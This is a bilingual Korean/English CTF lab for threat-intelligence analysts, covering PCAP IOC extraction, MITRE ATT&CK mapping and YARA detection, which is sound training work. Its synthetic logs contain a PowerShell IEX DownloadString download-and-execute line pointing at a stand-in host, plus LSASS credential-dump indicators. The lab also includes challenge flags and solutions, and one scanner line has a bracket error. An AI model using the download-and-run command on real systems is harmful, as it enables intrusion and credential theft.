> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 위협 인텔리전스 CTF 실습 랩

## 실습 환경 준비

### Docker Compose 환경

```yaml
# docker-compose.yml
version: "3.9"

services:
  pcap-server:
    image: python:3.11-slim
    container_name: pcap-server
    networks:
      cti-net:
        ipv4_address: 172.20.0.10
    volumes:
      - ./pcap-data:/data
    command: >
      sh -c "pip install scapy -q &&
             python3 -m http.server 8000 --directory /data"
    ports:
      - "8000:8000"

  log-server:
    image: python:3.11-slim
    container_name: log-server
    networks:
      cti-net:
        ipv4_address: 172.20.0.11
    volumes:
      - ./log-data:/logs
    command: python3 -m http.server 8001 --directory /logs
    ports:
      - "8001:8001"

  analyst:
    image: python:3.11-slim
    container_name: analyst
    networks:
      cti-net:
        ipv4_address: 172.20.0.100
    command: sleep infinity
    tty: true

networks:
  cti-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
```

### 필수 도구 설치

```bash
pip install scapy yara-python requests stix2 taxii2-client
sudo apt install -y wireshark tshark nmap
```

---

## 실습 1: PCAP에서 IOC 추출

### 목표

네트워크 패킷 캡처 파일을 분석하여 악성 행위 지표(IOC: Indicator of Compromise)를 추출한다.

**플래그 형식**: `CTF{ioc_<md5_of_extracted_c2_ip>}`

### 시나리오

제공된 `malware_traffic.pcap` 파일에 악성코드 C2(Command & Control) 통신이 포함되어 있다. HTTP 요청 패턴과 DNS 쿼리를 분석하여 C2 IP 주소와 도메인을 추출하라.

### 실습 파일 생성

```python
#!/usr/bin/env python3
"""실습용 PCAP 파일 생성기"""

from scapy.all import (
    IP, TCP, UDP, DNS, DNSQR, DNSRR,
    Raw, Ether, wrpcap, RandShort
)
import random

def create_ctf_pcap(output_path: str) -> None:
    packets = []

    # 정상 트래픽
    for i in range(5):
        pkt = (
            IP(src=f"192.168.1.{random.randint(2, 50)}", dst="8.8.8.8") /
            UDP(sport=RandShort(), dport=53) /
            DNS(rd=1, qd=DNSQR(qname="google.com"))
        )
        packets.append(pkt)

    # C2 DNS 쿼리 (악성 도메인)
    c2_domain = "evil-c2.malware-domain.com"
    c2_ip = "203.0.113.66"

    dns_query = (
        IP(src="192.168.1.200", dst="8.8.8.8") /
        UDP(sport=54321, dport=53) /
        DNS(rd=1, qd=DNSQR(qname=c2_domain))
    )
    packets.append(dns_query)

    dns_resp = (
        IP(src="8.8.8.8", dst="192.168.1.200") /
        UDP(sport=53, dport=54321) /
        DNS(
            qr=1, aa=1, qd=DNSQR(qname=c2_domain),
            an=DNSRR(rrname=c2_domain, rdata=c2_ip)
        )
    )
    packets.append(dns_resp)

    # C2 HTTP 비콘
    beacon_payload = (
        b"GET /beacon?id=INFECTED_HOST_001&cmd=idle HTTP/1.1\r\n"
        b"Host: evil-c2.malware-domain.com\r\n"
        b"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0)\r\n"
        b"X-Session: dGhpcyBpcyBhIGMy\r\n\r\n"
    )
    c2_http = (
        IP(src="192.168.1.200", dst=c2_ip) /
        TCP(sport=49152, dport=80, flags="PA") /
        Raw(load=beacon_payload)
    )
    packets.append(c2_http)

    # C2 응답 (명령 포함)
    c2_resp_payload = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: text/plain\r\n\r\n"
        b"CTF{ioc_c2_beacon_found_203_0_113_66}"
    )
    c2_resp = (
        IP(src=c2_ip, dst="192.168.1.200") /
        TCP(sport=80, dport=49152, flags="PA") /
        Raw(load=c2_resp_payload)
    )
    packets.append(c2_resp)

    wrpcap(output_path, packets)
    print(f"[+] PCAP 생성 완료: {output_path}")
    print(f"[+] C2 IP: {c2_ip}")
    print(f"[+] C2 도메인: {c2_domain}")

if __name__ == "__main__":
    create_ctf_pcap("malware_traffic.pcap")
```

### 힌트

1. `tshark -r malware_traffic.pcap -Y "dns" -T fields -e dns.qry.name` 로 DNS 쿼리 확인
2. HTTP 페이로드에서 특이한 헤더(`X-Session`, `User-Agent` 구형 IE)를 주목
3. C2 IP는 RFC 5737 문서용 IP 대역(`203.0.113.0/24`)에서 할당됨

### 풀이

```python
#!/usr/bin/env python3
"""PCAP IOC 추출 도구"""

import argparse
import hashlib
import ipaddress
from collections import Counter
from pathlib import Path

try:
    from scapy.all import rdpcap, IP, TCP, UDP, DNS, DNSQR, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[-] scapy 미설치: pip install scapy")


def is_private_ip(ip: str) -> bool:
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def extract_dns_iocs(packets: list) -> dict[str, list[str]]:
    """DNS 쿼리/응답에서 도메인과 IP 매핑 추출"""
    iocs: dict[str, list[str]] = {"domains": [], "dns_mappings": []}

    for pkt in packets:
        if pkt.haslayer(DNS):
            dns = pkt[DNS]
            if dns.qr == 0 and dns.qd:  # 쿼리
                domain = dns.qd.qname.decode(errors="ignore").rstrip(".")
                if domain and "." in domain:
                    iocs["domains"].append(domain)
            elif dns.qr == 1 and dns.an:  # 응답
                try:
                    mapping = f"{dns.an.rrname.decode().rstrip('.')} -> {dns.an.rdata}"
                    iocs["dns_mappings"].append(mapping)
                except Exception:
                    pass

    return iocs


def extract_http_iocs(packets: list) -> dict[str, list]:
    """HTTP 트래픽에서 URL, 헤더, 페이로드 추출"""
    iocs: dict[str, list] = {"urls": [], "suspicious_headers": [], "c2_ips": []}

    for pkt in packets:
        if pkt.haslayer(Raw) and pkt.haslayer(IP):
            payload = pkt[Raw].load.decode(errors="ignore")
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst

            if "HTTP" in payload and "GET" in payload:
                lines = payload.split("\r\n")
                for line in lines:
                    if line.startswith("GET ") or line.startswith("POST "):
                        iocs["urls"].append(f"{dst_ip}{line.split(' ')[1]}")
                    if line.startswith("X-") or "MSIE 6.0" in line:
                        iocs["suspicious_headers"].append(line)
                if not is_private_ip(dst_ip):
                    iocs["c2_ips"].append(dst_ip)

    return iocs


def generate_flag(c2_ip: str) -> str:
    digest = hashlib.md5(c2_ip.encode()).hexdigest()[:8]
    return f"CTF{{ioc_{digest}}}"


def analyze_pcap(pcap_path: str) -> None:
    if not SCAPY_AVAILABLE:
        return

    path = Path(pcap_path)
    if not path.exists():
        print(f"[-] 파일 없음: {pcap_path}")
        return

    packets = rdpcap(pcap_path)
    print(f"[*] 패킷 수: {len(packets)}")

    dns_iocs = extract_dns_iocs(packets)
    http_iocs = extract_http_iocs(packets)

    print("\n=== DNS IOC ===")
    for d in set(dns_iocs["domains"]):
        print(f"  도메인: {d}")
    for m in dns_iocs["dns_mappings"]:
        print(f"  매핑: {m}")

    print("\n=== HTTP IOC ===")
    for url in http_iocs["urls"]:
        print(f"  URL: {url}")
    for hdr in http_iocs["suspicious_headers"]:
        print(f"  의심 헤더: {hdr}")

    if http_iocs["c2_ips"]:
        c2 = Counter(http_iocs["c2_ips"]).most_common(1)[0][0]
        print(f"\n[+] C2 IP 후보: {c2}")
        print(f"[+] 플래그: {generate_flag(c2)}")


def main() -> None:
    parser = argparse.ArgumentParser(description="PCAP IOC 추출 도구")
    parser.add_argument("pcap", help="분석할 PCAP 파일 경로")
    args = parser.parse_args()
    analyze_pcap(args.pcap)


if __name__ == "__main__":
    main()
```

---

## 실습 2: MITRE ATT&CK TTP 매핑

### 목표

침해 사고 로그를 분석하여 공격자 행위를 MITRE ATT&CK 프레임워크의 기술(Technique)에 매핑하고 위협 행위자 그룹을 식별한다.

**플래그 형식**: `CTF{attck_<technique_id>_<group_name>}`

### 시나리오

보안 팀이 수집한 Windows 이벤트 로그와 Sysmon 로그에서 APT 공격 흔적을 발견했다. 로그를 분석하여 사용된 ATT&CK 기술 ID와 공격 그룹을 특정하라.

### 실습 로그 생성

```python
#!/usr/bin/env python3
"""CTF용 가상 공격 로그 생성기"""

import json
from datetime import datetime, timedelta
import random


ATTACK_SCENARIO = {
    "group": "APT29",
    "techniques": [
        {
            "id": "T1566.001",
            "name": "Spearphishing Attachment",
            "log": {
                "EventID": 4688,
                "ProcessName": "WINWORD.EXE",
                "CommandLine": "WINWORD.EXE /n invoice_2024.docm",
                "ParentProcess": "outlook.exe",
            },
        },
        {
            "id": "T1059.001",
            "name": "PowerShell",
            "log": {
                "EventID": 4104,
                "ScriptBlock": (
                    "IEX (New-Object Net.WebClient)."
                    "DownloadString('http://203.0.113.66/stage2.ps1')"
                ),
                "User": "CORP\\jdoe",
            },
        },
        {
            "id": "T1003.001",
            "name": "LSASS Memory",
            "log": {
                "EventID": 10,
                "SourceImage": "C:\\Windows\\Temp\\svchost32.exe",
                "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                "GrantedAccess": "0x1FFFFF",
            },
        },
        {
            "id": "T1071.001",
            "name": "Web Protocols C2",
            "log": {
                "EventID": 3,
                "DestinationIp": "203.0.113.66",
                "DestinationPort": 443,
                "Image": "C:\\Windows\\Temp\\svchost32.exe",
                "Initiated": True,
            },
        },
    ],
}


def generate_logs(output_path: str) -> None:
    logs = []
    base_time = datetime(2024, 6, 1, 9, 0, 0)

    for i, technique in enumerate(ATTACK_SCENARIO["techniques"]):
        log_entry = {
            "timestamp": (base_time + timedelta(minutes=i * 15)).isoformat(),
            "source": "Sysmon",
            **technique["log"],
            "_hint": f"MITRE: {technique['id']} - {technique['name']}",
        }
        logs.append(log_entry)

    # 플래그 힌트를 마지막 로그에 숨김
    logs[-1]["_note"] = (
        f"Threat Actor: {ATTACK_SCENARIO['group']} "
        f"| Primary TTP: {ATTACK_SCENARIO['techniques'][1]['id']}"
    )

    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=2, ensure_ascii=False)

    print(f"[+] 로그 생성 완료: {output_path}")


if __name__ == "__main__":
    generate_logs("incident_logs.json")
```

### 힌트

1. PowerShell `IEX` + `DownloadString` 조합은 특정 ATT&CK 기술의 전형적 패턴
2. LSASS 프로세스 접근(`GrantedAccess: 0x1FFFFF`)은 자격증명 덤프 행위
3. 러시아 APT 그룹 중 Cozy Bear로도 알려진 그룹을 확인

### 풀이

```python
#!/usr/bin/env python3
"""ATT&CK TTP 매핑 분석 도구"""

import argparse
import json
from dataclasses import dataclass
from pathlib import Path


@dataclass
class TTPMatch:
    technique_id: str
    technique_name: str
    evidence: str
    confidence: str


DETECTION_RULES: list[dict] = [
    {
        "id": "T1566.001",
        "name": "Spearphishing Attachment",
        "conditions": [
            lambda e: e.get("EventID") == 4688 and "WINWORD" in e.get("ProcessName", ""),
        ],
    },
    {
        "id": "T1059.001",
        "name": "PowerShell Execution",
        "conditions": [
            lambda e: e.get("EventID") == 4104,
            lambda e: "IEX" in e.get("ScriptBlock", "") or "DownloadString" in e.get("ScriptBlock", ""),
        ],
    },
    {
        "id": "T1003.001",
        "name": "LSASS Memory Dump",
        "conditions": [
            lambda e: "lsass.exe" in e.get("TargetImage", "").lower(),
            lambda e: e.get("GrantedAccess") in ["0x1FFFFF", "0x143A"],
        ],
    },
    {
        "id": "T1071.001",
        "name": "Web Protocol C2",
        "conditions": [
            lambda e: e.get("EventID") == 3 and e.get("DestinationPort") in [80, 443],
        ],
    },
]

APT_SIGNATURES: dict[str, list[str]] = {
    "APT29": ["T1566.001", "T1059.001", "T1003.001", "T1071.001"],
    "APT28": ["T1566.001", "T1059.003", "T1078"],
    "Lazarus": ["T1566.002", "T1055", "T1041"],
}


def match_ttps(events: list[dict]) -> list[TTPMatch]:
    matches: list[TTPMatch] = []

    for event in events:
        for rule in DETECTION_RULES:
            matched = any(cond(event) for cond in rule["conditions"])
            if matched:
                matches.append(TTPMatch(
                    technique_id=rule["id"],
                    technique_name=rule["name"],
                    evidence=json.dumps(
                        {k: v for k, v in event.items() if not k.startswith("_")},
                        ensure_ascii=False
                    )[:120],
                    confidence="HIGH",
                ))

    return matches


def identify_threat_actor(matched_ids: list[str]) -> str:
    matched_set = set(matched_ids)
    best_group = "Unknown"
    best_score = 0

    for group, ttps in APT_SIGNATURES.items():
        score = len(matched_set & set(ttps))
        if score > best_score:
            best_score = score
            best_group = group

    return best_group


def analyze_logs(log_path: str) -> None:
    path = Path(log_path)
    if not path.exists():
        print(f"[-] 파일 없음: {log_path}")
        return

    with open(path, encoding="utf-8") as f:
        events = json.load(f)

    print(f"[*] 이벤트 수: {len(events)}")
    matches = match_ttps(events)

    print("\n=== 탐지된 TTP ===")
    for m in matches:
        print(f"  [{m.confidence}] {m.technique_id} - {m.technique_name}")
        print(f"    근거: {m.evidence[:80]}...")

    matched_ids = [m.technique_id for m in matches]
    actor = identify_threat_actor(matched_ids)

    print(f"\n[+] 위협 행위자: {actor}")
    primary_ttp = matched_ids[1] if len(matched_ids) > 1 else matched_ids[0]
    flag = f"CTF{{attck_{primary_ttp.replace('.', '_')}_{actor}}}"
    print(f"[+] 플래그: {flag}")


def main() -> None:
    parser = argparse.ArgumentParser(description="ATT&CK TTP 매핑 도구")
    parser.add_argument("logs", help="분석할 JSON 로그 파일")
    args = parser.parse_args()
    analyze_logs(args.logs)


if __name__ == "__main__":
    main()
```

---

## 실습 3: YARA 룰 작성 및 악성 파일 탐지

### 목표

주어진 악성코드 샘플의 특징을 분석하여 YARA 룰을 작성하고, 숨겨진 플래그 파일을 탐지한다.

**플래그 형식**: `CTF{yara_<rule_name>_matched}`

### 시나리오

악성코드 분석팀이 새로운 변종 악성코드를 발견했다. 해당 악성코드의 특징적인 문자열과 바이트 패턴을 기반으로 YARA 룰을 작성하여 추가 감염 파일을 식별하라.

### 실습 파일 생성

```python
#!/usr/bin/env python3
"""YARA 실습용 가상 악성코드 샘플 생성기"""

import os
import struct
from pathlib import Path


def create_malware_sample(path: str, is_malicious: bool = True) -> None:
    """PE 헤더 구조를 모방한 가상 악성코드 생성"""
    # MZ 헤더
    content = b"MZ"
    content += b"\x90" * 58  # 패딩
    content += struct.pack("<I", 0x80)  # PE 오프셋

    if is_malicious:
        # 악성코드 특징 문자열
        content += b"\x00" * (0x80 - len(content))
        content += b"PE\x00\x00"
        content += b"\x00" * 20

        # 특징적 문자열 (C2 관련)
        content += b"CreateRemoteThread\x00"
        content += b"VirtualAllocEx\x00"
        content += b"http://203.0.113.66/c2/beacon\x00"
        content += b"\xde\xad\xbe\xef"  # 매직 바이트
        content += b"MALWARE_FAMILY_COBRA_V2\x00"
        content += b"CTF{yara_cobra_v2_matched}\x00"
    else:
        content += b"\x00" * (0x80 - len(content))
        content += b"PE\x00\x00"
        content += b"This is a legitimate application\x00"

    with open(path, "wb") as f:
        f.write(content)


def setup_yara_lab(lab_dir: str) -> None:
    os.makedirs(lab_dir, exist_ok=True)
    os.makedirs(f"{lab_dir}/samples", exist_ok=True)

    create_malware_sample(f"{lab_dir}/samples/suspicious_001.bin", True)
    create_malware_sample(f"{lab_dir}/samples/clean_app.bin", False)
    create_malware_sample(f"{lab_dir}/samples/suspicious_002.bin", True)

    yara_template = '''rule Cobra_V2_Malware {
    meta:
        description = "Detects Cobra V2 malware family"
        author = "CTF Lab"
        date = "2024-06-01"

    strings:
        $magic = { DE AD BE EF }
        $family = "MALWARE_FAMILY_COBRA_V2"
        $c2_url = "203.0.113.66/c2"
        $api1 = "CreateRemoteThread"
        $api2 = "VirtualAllocEx"

    condition:
        uint16(0) == 0x5A4D and  // MZ header
        $magic and
        $family and
        2 of ($c2_url, $api1, $api2)
}
'''
    with open(f"{lab_dir}/cobra_v2_template.yar", "w") as f:
        f.write(yara_template)

    print(f"[+] YARA 실습 환경 생성: {lab_dir}")


if __name__ == "__main__":
    setup_yara_lab("yara_lab")
```

### 힌트

1. `strings` 명령으로 샘플 내 ASCII 문자열 추출: `strings suspicious_001.bin`
2. 바이너리 패턴 확인: `xxd suspicious_001.bin | grep -A2 "dead"`
3. YARA 룰 테스트: `yara cobra_v2.yar samples/`

### 풀이

```python
#!/usr/bin/env python3
"""YARA 룰 생성 및 스캔 도구"""

import argparse
import os
import re
import struct
from pathlib import Path


def extract_strings(file_path: str, min_len: int = 6) -> list[str]:
    """바이너리에서 ASCII/유니코드 문자열 추출"""
    with open(file_path, "rb") as f:
        data = f.read()

    ascii_pattern = re.compile(rb"[ -~]{" + str(min_len).encode() + rb",}")
    return [m.group().decode("ascii") for m in ascii_pattern.finditer(data)]


def find_byte_patterns(file_path: str) -> list[str]:
    """의심스러운 바이트 패턴 탐색"""
    suspicious_patterns = [
        (b"\xde\xad\xbe\xef", "Magic bytes DE AD BE EF"),
        (b"\xca\xfe\xba\xbe", "Magic bytes CA FE BA BE"),
        (b"MZ", "MZ header (PE executable)"),
    ]

    with open(file_path, "rb") as f:
        data = f.read()

    found = []
    for pattern, desc in suspicious_patterns:
        if pattern in data:
            offset = data.index(pattern)
            found.append(f"0x{offset:04x}: {desc}")

    return found


def simple_yara_scan(rule_strings: list[str], file_path: str) -> bool:
    """단순 문자열 기반 YARA 유사 스캔 (yara-python 없을 경우 대체)"""
    with open(file_path, "rb") as f:
        data = f.read()

    matches = 0
    for s in rule_strings:
        if s.encode(errors="ignore") in data:
            matches += 1

    return matches >= 2


def scan_directory(target_dir: str) -> None:
    yara_strings = [
        "MALWARE_FAMILY_COBRA_V2",
        "CreateRemoteThread",
        "VirtualAllocEx",
        "203.0.113.66",
    ]

    target = Path(target_dir)
    if not target.exists():
        print(f"[-] 디렉토리 없음: {target_dir}")
        return

    print(f"[*] 스캔 대상: {target_dir}")
    flagged: list[str] = []

    for file_path in target.rglob("*"):
        if file_path.is_file():
            try:
                extracted = extract_strings(str(file_path))
                patterns = find_byte_patterns(str(file_path))
                is_malicious = simple_yara_scan(yara_strings, str(file_path))

                if is_malicious:
                    print(f"\n[!] 탐지: {file_path.name}")
                    for s in extracted:
                        if any(kw in s for kw in ["CTF{", "COBRA", "203.0.113"]):
                            print(f"    문자열: {s}")
                    for p in patterns:
                        print(f"    패턴: {p}")
                    flagged.append(str(file_path))

                    # 플래그 직접 추출
                    with open(file_path, "rb") as f:
                        content = f.read()
                    flag_match = re.search(rb"CTF\{[^}]+\}", content)
                    if flag_match:
                        print(f"\n[+] 플래그 발견: {flag_match.group().decode()}")

            except (PermissionError, OSError) as e:
                print(f"[-] 오류 {file_path}: {e}")

    print(f"\n[*] 스캔 완료. 탐지 파일: {len(flagged)}개")


def main() -> None:
    parser = argparse.ArgumentParser(description="YARA 기반 악성코드 스캐너")
    parser.add_argument("target", help="스캔할 파일 또는 디렉토리")
    parser.add_argument("--strings", action="store_true", help="문자열 추출 모드")
    args = parser.parse_args()

    if args.strings:
        strings = extract_strings(args.target)
        for s in strings:
            print(s)
    else:
        if Path(args.target).is_dir():
            scan_directory(args.target)
        else:
            is_mal = simple_yara_scan(
                ["MALWARE_FAMILY_COBRA_V2", "CreateRemoteThread"],
                args.target
            )
            print(f"[{'!'] if is_mal else ' '} {args.target}: {'악성' if is_mal else '정상'}")


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# Threat Intelligence CTF Practice Lab

## Lab Environment Setup

### Docker Compose Environment

```yaml
# docker-compose.yml
version: "3.9"

services:
  pcap-server:
    image: python:3.11-slim
    container_name: pcap-server
    networks:
      cti-net:
        ipv4_address: 172.20.0.10
    volumes:
      - ./pcap-data:/data
    command: python3 -m http.server 8000 --directory /data
    ports:
      - "8000:8000"

  analyst:
    image: python:3.11-slim
    container_name: analyst
    networks:
      cti-net:
        ipv4_address: 172.20.0.100
    command: sleep infinity

networks:
  cti-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
```

### Required Tools

```bash
pip install scapy yara-python requests stix2
sudo apt install -y wireshark tshark
```

---

## Challenge 1: IOC Extraction from PCAP

### Objective

Analyze a network packet capture file to extract Indicators of Compromise (IOCs) including C2 IP addresses and malicious domains.

**Flag format**: `CTF{ioc_<md5_of_extracted_c2_ip>}`

### Scenario

The provided `malware_traffic.pcap` contains C2 (Command & Control) communication from malware. Analyze HTTP request patterns and DNS queries to extract the C2 IP address and domain.

### Hints

1. Use `tshark -r malware_traffic.pcap -Y "dns" -T fields -e dns.qry.name` to inspect DNS queries
2. Look for unusual HTTP headers (`X-Session`, old IE `User-Agent`)
3. The C2 IP is allocated from the RFC 5737 documentation range (`203.0.113.0/24`)

### Solution

Use `extract_ioc.py` (see Korean section) with:

```bash
python3 extract_ioc.py malware_traffic.pcap
```

The script extracts DNS IOCs, HTTP URLs, suspicious headers, and identifies C2 IPs. The flag is generated from an MD5 hash of the identified C2 IP.

---

## Challenge 2: MITRE ATT&CK TTP Mapping

### Objective

Analyze incident response logs to map attacker behavior to MITRE ATT&CK techniques and identify the threat actor group.

**Flag format**: `CTF{attck_<technique_id>_<group_name>}`

### Scenario

Security logs from a compromised Windows endpoint contain traces of an APT attack. Analyze the logs to identify the ATT&CK technique IDs used and the attacking group.

### Key Techniques to Find

| Event ID | Indicator | ATT&CK Technique |
|----------|-----------|-----------------|
| 4688 | WINWORD opening .docm | T1566.001 Spearphishing |
| 4104 | PowerShell IEX DownloadString | T1059.001 PowerShell |
| 10 | LSASS access 0x1FFFFF | T1003.001 LSASS Memory |
| 3 | Outbound to 203.0.113.66:443 | T1071.001 Web Protocol C2 |

### Solution

```bash
python3 generate_logs.py          # create incident_logs.json
python3 analyze_ttps.py incident_logs.json
# Output: CTF{attck_T1059_001_APT29}
```

---

## Challenge 3: YARA Rule Writing and Malware Detection

### Objective

Analyze malware sample characteristics and write a YARA rule to detect hidden flag files.

**Flag format**: `CTF{yara_<rule_name>_matched}`

### Scenario

The malware analysis team discovered a new variant called Cobra V2. Write a YARA rule based on its characteristic strings and byte patterns to identify additional infected files.

### YARA Rule Template

```yara
rule Cobra_V2_Malware {
    meta:
        description = "Detects Cobra V2 malware family"

    strings:
        $magic    = { DE AD BE EF }
        $family   = "MALWARE_FAMILY_COBRA_V2"
        $c2_url   = "203.0.113.66/c2"
        $api_crt  = "CreateRemoteThread"
        $api_vae  = "VirtualAllocEx"

    condition:
        uint16(0) == 0x5A4D and
        $magic and $family and
        2 of ($c2_url, $api_crt, $api_vae)
}
```

### Solution

```bash
python3 setup_lab.py              # creates yara_lab/ with samples
python3 yara_scanner.py yara_lab/samples/
# Detects suspicious_001.bin and suspicious_002.bin
# Extracts: CTF{yara_cobra_v2_matched}
```
